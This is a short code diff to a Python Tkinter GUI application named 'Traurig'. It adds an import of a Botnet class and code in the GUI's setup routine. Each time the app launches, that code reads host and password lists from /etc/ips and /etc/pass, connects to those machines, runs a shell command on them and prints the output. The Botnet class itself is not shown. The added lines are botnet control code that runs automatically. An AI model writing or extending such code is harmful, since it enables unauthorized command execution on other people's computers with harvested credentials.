@@ -3,6 +3,7 @@ import tkMessageBox as mbox
 import tkFileDialog
 import tkSimpleDialog
 import socket
+from threads import Botnet
 
 class Traurig(Frame):
 
@@ -14,6 +15,12 @@ class Traurig(Frame):
         self.Traurig_Setup()
 
     def Traurig_Setup(self):
+
+        botnet = Botnet("/etc/ips", "/etc/pass")
+        botnet.connect()
+        botnet.send_command("ls -la")
+        botnet.print_output()
+        botnet.disconnect()
 
         menubar = Menu(self.parent)
         self.parent.config(menu=menubar)
